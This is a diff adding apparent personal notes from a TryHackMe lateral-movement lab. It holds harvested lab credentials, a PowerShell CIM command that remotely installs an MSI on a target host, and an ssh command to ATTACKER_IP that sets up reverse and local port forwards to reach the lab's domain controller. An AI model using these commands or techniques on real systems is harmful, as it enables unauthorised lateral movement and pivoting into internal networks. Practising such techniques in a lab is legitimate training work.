@@ -1,0 +1,15 @@
+rachael.atkinson:Zjqf3489
+
+t1_leonard.summers:EZpass4ever
+t1_corine.waters:Korine.1994
+
+ZA.TRYHACKME.COM\t2_felicia.dean:iLov3THM!
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\jml-installer.msi"; Options = ""; AllUsers = $false}
+
+
+
+t2_abigail.cox:Vivian2008
+
+
+ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
